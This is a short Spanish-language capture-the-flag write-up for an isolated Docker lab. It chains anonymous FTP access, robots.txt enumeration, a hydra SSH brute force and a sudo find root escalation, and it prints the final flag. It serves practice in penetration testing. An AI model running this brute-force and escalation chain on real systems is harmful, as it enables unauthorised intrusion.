Laboratorio montado con Docker para practicar la cadena completa en una red aislada. Cuatro banderas.

## 1 · FTP anónimo

```
ftp 10.10.10.11
# usuario: anonymous
```

Dentro encuentro una nota que menciona el sitio web interno.

## 2 · Enumeración web

```
curl 10.10.10.12/robots.txt
# Disallow: /panel-secreto/
```

El panel revela un usuario (`juan`) y que su contraseña es muy común.

## 3 · Fuerza bruta SSH

```
hydra -l juan -P diccionario.txt ssh://10.10.10.13
```

## 4 · Escalada de privilegios

El usuario puede ejecutar `find` como root ([GTFOBins](https://gtfobins.github.io/gtfobins/find/)):

```
sudo find . -exec /bin/bash \; -quit
# ahora soy root
```

Bandera final: ==FLAG{eres_root_felicidades}==
